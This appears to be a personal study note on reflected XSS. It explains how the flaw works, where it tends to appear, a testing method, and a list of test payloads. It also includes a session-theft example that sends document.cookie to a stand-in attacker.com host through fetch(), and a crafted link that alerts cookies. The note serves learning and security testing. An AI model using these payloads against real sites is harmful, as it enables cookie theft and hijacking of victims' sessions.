# XSS – Reflected XSS

## Overview

Reflected XSS is a **Non-Persistent XSS vulnerability** where malicious input:

```
is sent to the server
is reflected in the HTTP response
is immediately executed in the browser
```

The payload is **not stored** in the database.

Execution only occurs when the victim loads the malicious request.

---

# Key Characteristics

- processed by backend server
- payload reflected in response
- not stored in database
- requires victim interaction
- often delivered via crafted URL
- disappears after page refresh
- affects individual users

---

# Basic Concept

Application receives input:

```
search term
error message
form field
URL parameter
```

Application returns response including user input:

```html
Task 'INPUT' could not be added.
```

If input is not sanitized:

```
JavaScript executes in browser
```

---

# Example Vulnerable Behaviour

User input:

```
test
```

Response:

```html
Task 'test' could not be added.
```

---

# Test XSS Payload

```html
<script>alert(window.origin)</script>
```

---

# Injected Input

```html
<script>alert(window.origin)</script>
```

---

# Resulting Response

```html
Task '<script>alert(window.origin)</script>' could not be added.
```

Browser executes script:

```
alert popup triggered
```

---

# Why This Works

Application reflects unsanitized input:

```html
<div>
Task '<script>alert(window.origin)</script>' could not be added.
</div>
```

Browser interprets:

```
<script>
```

as executable JavaScript.

---

# Reflected XSS Flow

1. attacker crafts payload
2. payload sent via request
3. server reflects input in response
4. victim loads response
5. browser executes JavaScript

---

# Example URL Attack

```url
http://target/app?task=<script>alert(1)</script>
```

Victim clicks link.

Payload executes instantly.

---

# Identifying Reflected XSS

Common indicators:

- input appears in response
- error messages display user data
- search results echo search term
- form validation messages show input
- URL parameters appear in page content

---

# Checking Request Type

Reflected XSS commonly occurs in:

```
GET requests
```

GET parameters visible in URL:

```
?task=test
?search=query
?id=123
```

---

# Example GET Request

```http
GET /todo.php?task=test HTTP/1.1
```

---

# Malicious Version

```http
GET /todo.php?task=<script>alert(1)</script>
```

---

# Delivering the Attack

Attacker sends victim crafted link:

```url
http://target/todo.php?task=<script>alert(document.cookie)</script>
```

Victim clicks link.

Payload executes automatically.

---

# Viewing Reflected Payload in Source

Example page source:

```html
<div>
Task '<script>alert(window.origin)</script>' could not be added.
</div>
```

Confirms:

```
unsanitized input reflected
```

---

# Common Reflected XSS Locations

### search pages

```
?q=searchterm
```

---

### login error messages

```
invalid username test
```

---

### contact forms

```
thank you USERNAME
```

---

### filters

```
category=books
```

---

### tracking parameters

```
ref=twitter
```

---

# Example Test Payloads

## basic detection

```html
<script>alert(1)</script>
```

---

## confirm domain execution

```html
<script>alert(window.origin)</script>
```

---

## HTML injection test

```html
<b>XSS</b>
```

---

## attribute injection

```html
" onmouseover="alert(1)
```

---

## image error trigger

```html
<img src=x onerror=alert(1)>
```

---

# Realistic Attack Example

Session theft:

```html
<script>
fetch("http://attacker.com/log?c="+document.cookie)
</script>
```

---

# Limitations of Reflected XSS

- requires user interaction
- not persistent
- must socially engineer victim
- link may appear suspicious
- may require URL encoding

---

# Encoding Payloads

Special characters must often be encoded:

```html
<script>alert(1)</script>
```

URL encoded:

```
%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

---

# Testing Methodology

### Step 1 – identify reflection point

```
submit input
observe output
```

---

### Step 2 – inject test payload

```html
<script>alert(1)</script>
```

---

### Step 3 – confirm execution

alert popup triggered.

---

### Step 4 – craft exploit URL

deliver to victim.

---

# Reflected vs Stored XSS

| Feature | Reflected | Stored |
|--------|----------|-------|
| persistence | no | yes |
| stored in DB | no | yes |
| requires victim interaction | yes | often no |
| attack scale | limited | large |
| delivery method | malicious link | application page |

---

# Key Takeaways

- reflected XSS occurs in server responses
- payload not stored
- commonly delivered via URLs
- requires user interaction
- very common vulnerability type
- often found in search and error pages

---

# Quick Reference

## test payload

```html
<script>alert(1)</script>
```

---

## URL encoded payload

```
%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

---

## confirm reflection

view page source.

---

# Tags

#xss  
#reflected-xss  
#non-persistent-xss  
#web-security  
#owasp  
#pentesting  
#javascript  
#client-side  
#obsidian